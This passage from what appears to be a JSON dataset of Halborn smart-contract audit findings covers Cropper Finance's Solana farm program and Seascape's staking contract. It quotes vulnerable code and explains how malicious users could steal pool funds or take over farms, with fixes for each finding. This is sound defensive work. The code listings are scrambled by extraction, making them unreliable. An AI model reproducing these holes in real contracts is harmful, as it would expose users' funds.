fee_owner_info . clone () , authority_info . clone () , farm_pool . nonce , harvest_fee ) ?; // user 's real pending amount let _pending = pending - harvest_fee ; // transfer pending reward amount from reward pool to user reward token account Self :: token_transfer ( farm_id_info . key , token_program_info . clone () , pool_reward_token_account_info . clone () , user_reward_token_account_info . clone () , authority_info . clone () , farm_pool . nonce , _pending 360 361 362 363 364 365 366 367 368 369 370 } 371 372 // deposit ( stake lp token ) 373 if amount > 0 { ) ?; } 17 374 // transfer lp token amount from user ' s lp token account to pool ' s lp token pool Self :: token_transfer ( farm_id_info . key , token_program_info . clone () , user_lp_token_account_info . clone () , pool_lp_token_account_info . clone () , user_transfer_authority_info . clone () , farm_pool . nonce , amount ) ?; // update user 's deposited balance user_info . deposit_balance += amount ; 375 376 377 378 379 380 381 382 383 384 385 386 387 } Risk Level: Likelihood - 5 Impact - 5 Recommendations: It is of paramount importance to validate the fee, source and target token account addresses to match the intended ones in order to prevent users from stealing the tokens from the pool. Remediation Plan: SOLVED: Fixed in commit bcf5da93c14b4003f61705078f0f0788af866c00. 18 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_Farm_Solana_Program",
            "Severity: Critical"
        ]
    },
    {
        "title": "FARM TAKEOVER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Users call the process_initialize function to set farm parameters. When they pay the fee the farm is active and the is_allowed attribute is set to true. The process_initialize function however does not verify if the user-supplied farm account hasnt already been allowed, so it is possible for a malicious user to overwrite any farm by sending a transaction with the Initialize instruction and reset all farm parameters. This means the is_allowed property is also reset and the farms inactive again. However, because the user-supplied account with the amm_id address is not verified to be owned by the cropper-liquidity-pool program a malicious user may use a fake amm_id account with either token_a_mint or token_b_mint set to the CRP mint address and a random public key as the other of the two to takeover and overwrite all its parameters without deactivating the farm. Code Location: Listing 4: processor.rs (Lines 121) 117 // reward token 's mint account information 118 let reward_mint_info = next_account_info ( account_info_iter ) ?; 119 120 // amm account information what have lp token mint , token_a mint , token_b mint 121 let amm_id_info = next_account_info ( account_info_iter ) ?; 122 123 // spl - token program account information 124 let token_program_info = next_account_info ( account_info_iter ) ?; Listing 5: processor.rs (Lines 167,169,171,177,181,198) 160 // CRP token pairing flag 161 let mut crp_token_pairing = 0; 162 19 163 // CRP token mint address 164 let crp_pubkey = Pubkey :: from_str ( CRP_MINT_ADDRESS ). unwrap () ; 165 166 // other token mint address to check token pairing 167 let mut other_pubkey = * amm_swap . token_a_mint () ; 168 169 if * amm_swap . token_a_mint () == crp_pubkey { 170 171 172 173 } 174 175 if * amm_swap . token_b_mint () == crp_pubkey { 176 177 178 } 179 180 // check if this creator can create \" locked farms \" specified by // this is crp token pair crp_token_pairing = 1; other_pubkey = * amm_swap . token_b_mint () ; // this is crp token pair crp_token_pairing = 1; site owner 181 if crp_token_pairing == 1 { 182 if other_pubkey == Pubkey :: from_str ( USDC_MINT_ADDRESS ). unwrap () || other_pubkey == Pubkey :: from_str ( USDT_MINT_ADDRESS ). unwrap () || other_pubkey == Pubkey :: from_str ( SOL_MINT_ADDRESS ). unwrap () || other_pubkey == Pubkey :: from_str ( ETH_MINT_ADDRESS ). unwrap () { // check if creator is allowed creator // if not returns WrongCreator error if * creator_info . key ! = Pubkey :: from_str ( ALLOWED_CREATOR ). unwrap () { return Err ( FarmPoolError :: WrongCreator . into () ); } } 183 184 185 186 187 188 189 190 191 192 193 } Risk Level: Likelihood - 4 Impact - 5 20 Recommendations: It is recommended to verify if the farm hasnt been already allowed before updating its parameters. Remediation Plan: SOLVED: Fixed in commit bcf5da93c14b4003f61705078f0f0788af866c00. 21 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_Farm_Solana_Program",
            "Severity: High"
        ]
    },
    {
        "title": "DELEGATE VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Among the accounts provided by farm creator on farm initialisation are the farms LP token account which serves as token pool for all users de- positing their tokens and the reward account which holds all the generated rewards. Both accounts authority is assigned to the farm authority. The process_initialise function does not validate however if those accounts do not have any delegates. It is possible for a malicious user to initialize a farm with his own address as the accounts delegate before transferring their authorities to the farm authority. Since the swap program does not support pool properties modification it is impossible to remove the delegation thus giving the malicious user full control over the deposited funds and generated rewards. Code Location: Listing 6: processor.rs (Lines 109,112) 105 // creator wallet account information 106 let creator_info = next_account_info ( account_info_iter ) ?; 107 108 // lp token account information to store lp token in the pool 109 let pool_lp_token_account_info = next_account_info ( account_info_iter ) ?; 110 111 // reward token account information to store reward token in the pool 112 let pool_reward_token_account_info = next_account_info ( account_info_iter ) ?; 113 114 // lp token ' s mint account information 115 let pool_mint_info = next_account_info ( account_info_iter ) ?; 116 117 // reward token 's mint account information 22 118 let reward_mint_info = next_account_info ( account_info_iter ) ?; Listing 7: processor.rs (Lines 205,208) 201 // initialize fee owner with predefined wallet address 202 farm_pool . fee_owner = Pubkey :: from_str ( FEE_OWNER ). unwrap () ; 203 204 // initialize lp token account to store lp token 205 farm_pool . pool_lp_token_account = * pool_lp_token_account_info . key ; 206 207 // initialize reward token account to store reward token 208 farm_pool . pool_reward_token_account = * pool_reward_token_account_info . key ; 209 210 // store nonce to authorize this farm account 211 farm_pool . nonce = nonce ; 212 213 // store lp token mint address 214 farm_pool . pool_mint_address = * pool_mint_info . key ; Risk Level: Likelihood - 4 Impact - 5 Recommendations: It is recommended to verify if the farms LP token account and reward account do not have delegates. Remediation Plan: SOLVED: Fixed in commit 21c2e5892a412f49149bb2530757737787315d0c. 23 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_Farm_Solana_Program",
            "Severity: High"
        ]
    },
    {
        "title": "HARDCODED GOVERNANCE ADDRESSES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Several important governance accounts/wallets addresses are hardcoded in cropper-lp/program/src/constraints.rs and yield-farming-v1/program/src/ constants.rs. In case those addresses are compromised the program owner has no way of updating them, putting users funds at risk. Code Location: Listing 8: yield-farming-v1/program/src/constants.rs (Lines 19,23) 16 // / Fee owner wallet address 17 // / This includes harvest fee 18 // / So this wallet address should have all token accounts of registered token - list 19 pub const FEE_OWNER :& str = if DEVNET_MODE { \" BRmxAJ3ThceU2SXt6weyXarRNvAwZUtKuKbzSRneRxJn \"} else {\" 4 GJ3z4skEHJADz3MVeNYBg4YV8H27rBQey2YYdiPC8PA \" }; 20 21 // / This is allowed wallet address to create specified farms by site owner 22 // / Specified farms are SOL - USDC , SOL - CRP , USDT - CRP , USDC - CRP , ETH - USDC , ETH - CRP 23 pub const ALLOWED_CREATOR :& str = if DEVNET_MODE { \"4 GJ3z4skEHJADz3MVeNYBg4YV8H27rBQey2YYdiPC8PA \" } else { \" BRmxAJ3ThceU2SXt6weyXarRNvAwZUtKuKbzSRneRxJn \" }; Risk Level: Likelihood - 1 Impact - 5 24 Recommendations: Consider making the governance addresses modifiable and implement a func- tion to update these addresses in case they are compromised. Remediation Plan: SOLVED: Fixed in commit 643636779a5eac3a000e217406cbd8be479f6b4e. 25 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_Farm_Solana_Program",
            "Severity: Medium"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An overflow happens when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of digits. For example, in the pending_rewards function defined in state.rs two u64 values are multiplied without checking whether the result is within the range that can be represented with a given number of bits. If it isnt, in Rust the resulting value is specified to wrap as twos complement, resulting in a value either too low or too high considering the circumstances. Code Location: Listing 9: state.rs (Lines 66,71) 62 impl FarmPool { 63 64 65 66 // / get current pending reward amount for a user pub fn pending_rewards (& self , user_info :& mut UserInfo ) -> u64 { let reward_per_share_net : u64 = self . reward_per_share_net ; return user_info . deposit_balance * reward_per_share_net / REWARD_MULTIPLER - user_info . reward_debt ; 67 68 69 70 71 } // / get total reward amount for a user so far pub fn get_new_reward_debt (& self , user_info :& UserInfo ) -> u64 { return user_info . deposit_balance * self . reward_per_share_net / REWARD_MULTIPLER ; } 72 73 74 } Listing 10: processor.rs (Lines 669) 666 // update reward per second in the rest period from now 667 let duration = farm_pool . end_timestamp - cur_timestamp ; 668 let added_reward_per_second = amount / duration ; 26 669 farm_pool . reward_per_timestamp += added_reward_per_second ; Listing 11: processor.rs (Lines 770,771) return ; 759 // check if valid current timestamp 760 if farm_pool . last_timestamp >= cur_timestamp { 761 762 } 763 if lp_supply == 0 || farm_pool . reward_per_timestamp == 0 { 764 765 766 } 767 768 // update reward per share net and last distributed timestamp 769 let multiplier = cur_timestamp - farm_pool . last_timestamp ; 770 let reward = multiplier * farm_pool . reward_per_timestamp ; 771 farm_pool . reward_per_share_net = farm_pool . reward_per_share_net + farm_pool . last_timestamp = cur_timestamp ; return ; REWARD_MULTIPLER * reward / lp_supply ; 772 farm_pool . last_timestamp = cur_timestamp ; Risk Level: Likelihood - 3 Impact - 3 Recommendations: Consider replacing the multiplication and subtraction operators with Rusts checked_mul and checked_sub for 64bit unsigned integers. Remediation Plan: SOLVED: Fixed in commit c8aaf6386305947ec1d7c3c1a9aabf448ae2a92a. 27 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_Farm_Solana_Program",
            "Severity: Medium"
        ]
    },
    {
        "title": "INITIALISING FARM WITH INVALID TOKEN ACCOUNTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_Farm_Solana_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "To be initialised, a farm requires two token accounts to be provided by the initialising user: an LP token account and a reward account. Neither of the accounts is verified not to be frozen, to match a relevant mint, or to have the farm authority be the transfer authority, therefore it is possible for a malicious user to create a frozen pool with tokens that cannot effectively be accessed. Additionally, the corresponding AMM account (also user-supplied) is not validated to be owned by the Swap program. Code Location: Listing 12: processor.rs (Lines 109,112,115,121) 105 // creator wallet account information 106 let creator_info = next_account_info ( account_info_iter ) ?; 107 108 // lp token account information to store lp token in the pool 109 let pool_lp_token_account_info = next_account_info ( account_info_iter ) ?; 110 111 // reward token account information to store reward token in the pool 112 let pool_reward_token_account_info = next_account_info ( account_info_iter ) ?; 113 114 // lp token ' s mint account information 115 let pool_mint_info = next_account_info ( account_info_iter ) ?; 116 117 // reward token 's mint account information 118 let reward_mint_info = next_account_info ( account_info_iter ) ?; 119 28 120 // amm account information what have lp token mint , token_a mint , token_b mint 121 let amm_id_info = next_account_info ( account_info_iter ) ?; Listing 13: processor.rs (Lines 207,210,216,222) 206 // initialize lp token account to store lp token 207 farm_pool . pool_lp_token_account = * pool_lp_token_account_info . key ; 208 209 // initialize reward token account to store reward token 210 farm_pool . pool_reward_token_account = * pool_reward_token_account_info . key ; 211 212 // store nonce to authorize this farm account 213 farm_pool . nonce = nonce ; 214 215 // store lp token mint address 216 farm_pool . pool_mint_address = * pool_mint_info . key ; 217 218 // store spl - token program address 219 farm_pool . token_program_id = * token_program_info . key ; 220 221 // store reward token mint address 222 farm_pool . reward_mint_address = * reward_mint_info . key ; Risk Level: Likelihood - 1 Impact - 2 Recommendations: Before initialising the farm, it is recommended to verify if both token accounts have the farm PDA as authority, match the relevant mints and if the state property of both token accounts is not Frozen. Validate the AMM account owner to match the Swap program ID. 29 Remediation Plan: SOLVED: Fixed in commit 3755e767c151ded394baa104994597fe615bbbf1. 30 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_Farm_Solana_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "ADMIN CAN CHANGE SESSION DETAILS AFTER THE START OF A SESSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Testing revealed that the setType function allowed the owner of the con- tract to change details regarding running sessions. Should this privilege be abused or the private key of the owner be stolen, users might risk of burning their NFTs without their knowledge when unstaking. This is due to the function allowing to set the NFTs in a certain session to burn and whether users get a bonus by playing the game. Code Location: NewStakingSaloon.sol Lines# Listing 1 function setType ( uint256 _sessionId , bool _burn , bool _specify ) Session storage _session = sessions [ _sessionId ]; require ( block . timestamp <= ( _session . startTime + _session . 1 // change type about session 2  external onlyOwner { 3 4  period ) , \" saloon : session end \"); 5 6 7 _session . burn _session . specify = _specify ; = _burn ; } Risk Level: Likelihood - 1 Impact - 5 13 Recommendation: Halborn recommends that this function is removed so that it cannot be abused by the owner role. Remediation Plan: SOLVED: The Seascape team removed the function. 14 ",
        "labels": [
            "Halborn",
            "Seascape_New_Staking_Saloon",
            "Severity: Medium"
        ]
    },
    {
        "title": "NOT CHECKING BALANCE BEFORE AND AFTER UNTRUSTED TOKENS TRANSFERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "Seascape_New_Staking_Saloon",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCHECKED CONTRACT BALANCE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Testing revealed that when a session is created, there are no checks to ensure that the contract balance is enough to pay the reward. This could lead to failed transactions when users unstake or claim their rewards. Code Location: NewStakingSaloon.sol Lines# 117-156 Listing 3 external onlyOwner address _rewardToken , uint256 _totalReward , uint256 _period , uint256 _startTime , address _verifier 1 function startSession ( 2 3 4 5 6 7 ) 8 9 10 { 11  address \" ); 12  Seassion should start in the future \"); 13  should be greater than 0\" ); 14  should be greater than 0\" ); 15  address \" ); 16 17 18  start when session is active \"); 19 if ( lastSessionId > 0) { } require ( _rewardToken != address (0) , \" Token can 't be zero require ( _startTime > block . timestamp , \" Seascape Staking : require ( _period > 0, \" Seascape Staking : Session duration require ( _totalReward > 0, \" Seascape Staking : Reward amount require ( _verifier != address (0) , \" verifier can 't be zero require (! isActive ( lastSessionId ) , \" Seascape Staking : Can 't 17 // // creating the session // // / @dev required CWS balance of this contract // require ( crowns . balanceOf ( address ( this ) ) >= _totalReward , \" uint256 _sessionId = sessionId . current () ; uint256 _rewardUnit = _totalReward . mul ( MULTIPLIER ). div ( _period 20 21 22  Seascape Staking : Not enough balance of Crowns for reward \") ; 23 24  --------------- -------------- ---- ---- --- ----------------------------  25 26  --------------- -------------- ---- ---- --- ----------------------------  27 28  ); 29 sessions [ _sessionId ] = Session ( _totalReward , _period ,  _startTime , 0, 0, _rewardUnit , 0, 0 , _startTime , true , false , 0) ; 30 31  --------------- -------------- ---- ---- --- ----------------------------  32 33  --------------- -------------- ---- ---- --- ----------------------------  34 35 36 37 38 39  _startTime + _period ); 40 } sessionId . increment () ; rewardToken = IERC20 ( _rewardToken ); lastSessionId = _sessionId ; verifier = _verifier ; // updating rest of session related data // emit SessionStarted ( _sessionId , _totalReward , _startTime , // Risk Level: Likelihood - 2 Impact - 2 18 Recommendation: Halborn recommends that a check is added to ensure that the contract balance is enough to pay rewards to the users. This could be implemented as follows: Listing 4 1 require ( rewardToken . balanceOf ( address ( this )) >= _totalReward ,  Seascape Staking : Not enough balance for reward \" ); \" Remediation Plan: SOLVED: The Seascape team amended the code to add contract balance checks. 19 ",
        "labels": [
            "Halborn",
            "Seascape_New_Staking_Saloon",
            "Severity: Low"
        ]
    },
    {
        "title": "COMMENTED OUT CODE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are instances within the code where commented code is left from previous development iterations. While this does not cause any security concerns, it makes the contract less readable. Code Location: NewStakingSaloon.sol Lines# 137-138 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the code is removed to improve the readability of the code. Remediation Plan: SOLVED: The Seascape team removed commented code for readability. 20 ",
        "labels": [
            "Halborn",
            "Seascape_New_Staking_Saloon",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE SIGNATURE REPLAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Within the NewStakingSaloon.sol smart contract, there are some occur- rences where signature replay attacks can be executed. While the contract logic would prevent any meaningful exploitation of those, there might be some extreme test cases which might introduce risks to the platform and their users. Code Location: NewStakingSaloon.sol Lines# 196-201  In the deposit function Listing 5 bytes32 _messageNoPrefix = keccak256 ( abi . encodePacked ( _nftId , { 1 2  _sp )); 3  Signed Message :\\ n32 \" , _messageNoPrefix )) ; 4 5  verification failed \" ); 6 } bytes32 _message = keccak256 ( abi . encodePacked (\" \\ x19Ethereum address _recover = ecrecover ( _message , _v , _r , _s ); require ( _recover == verifier , \" Nft Staking : Seascape points  In the verifyBonus function Listing 6 1 bytes32 _messageNoPrefix = keccak256 ( abi . encodePacked ( 2 3 _bonusPercent , _balance [0]. nftId , 21 _balance [1]. nftId , _balance [2]. nftId 4 5 6 )); 7 8 // / Validation of bonus 9 // / @dev 3. verify that signature for message was signed by  contract owner 10  Signed Message :\\ n32 \" , _messageNoPrefix )) ; 11 12  verification failed \" ); address _recover = ecrecover ( _message , _v , _r , _s ); require ( _recover == verifier , \" NFT Staking : Seascape points bytes32 _message = keccak256 ( abi . encodePacked ( \" \\ x19Ethereum Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to have a unique value in the signatures that always prevents the reuse of signatures. In this case, it is recommended to use a nonce value that would be stored on an account basis or to use msg.sender in the signature verification. This will prevent any other user from reusing previous signatures. Remediation Plan: SOLVED: The Seascape team added a nonce to the signature verification. 22 ",
        "labels": [
            "Halborn",
            "Seascape_New_Staking_Saloon",
            "Severity: Informational"
        ]
    },
    {
        "title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the loop below, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This does not only apply to the iterator variable. It also applies to variables declared within the loop code block. Code Location: NewStakingSaloon.sol Line #372-374 Listing 7 for ( uint _index = 0; _index < 3; _index ++) { _interests = _interests . add ( calculateInterest ( _sessionId , 1 2  msg . sender , _index )); 3 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This applies to the iterator variable and to variables declared within the loop code block. 23 Remediation Plan: SOLVED: The Seascape team amended the code as suggested to optimize the contract. 24 ",
        "labels": [
            "Halborn",
            "Seascape_New_Staking_Saloon",
            "Severity: Informational"
        ]
    },
    {
        "title": "UPGRADE TO AT LEAST PRAGMA 0.8.10",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_New_Staking_Saloon_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Gas optimizations and additional safety checks are available for free when using newer compiler versions and the optimizer.  Safemath by default since 0.8.0 (can be more gas efficient than the SafeMath library)  Low level inline: as of 0.8.2, leads to cheaper gas runtime. This is especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not built in, they cost an additional 20 to 40 gas due to the 2 extra jump instructions and additional stack operations needed for function calls.  Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases, used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.  Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors. Code Location: The contract within scope made use of the pragma version 0.6.7 Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: Halborn recommends that the project is upgraded to use at least pragma 0.8.10. Remediation Plan: ACKNOWLEDGED: The Seascape team keeps the same version of the Solidity compiler. 26 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Seascape_New_Staking_Saloon",
            "Severity: Informational"
        ]
    }
]